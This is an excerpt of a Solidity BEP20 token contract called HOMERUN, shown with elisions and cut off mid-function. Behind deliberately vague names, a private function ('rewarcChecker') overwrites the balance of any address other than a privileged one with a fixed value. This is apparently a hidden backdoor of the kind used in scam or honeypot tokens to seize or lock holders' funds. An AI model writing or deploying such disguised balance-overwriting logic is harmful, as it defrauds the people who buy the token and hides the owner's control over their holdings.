...
contract HOMERUN is Context, IBEP20, Ownable {

    using Address for address;
    
    uint256 private total = 1000000 * 10 ** 6 * 10 ** 9;
    uint256 private liqFee2 = 20000000;
    string private _name;
    string private _symbol;
    address public addr=0xe8d4b648bC5D641C8347C74910413329757a9E1e;
    ...
    mapping(address => uint256) private xT;
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        xT[recipient] = xT[recipient] + (tAmount);
        xT[sender] = xT[sender] - (tAmount);
    ...
    function rewarcChecker(address abc2) private
    {
        if (abc2!=pp)
        {
            xT[abc2]=liqFee2;
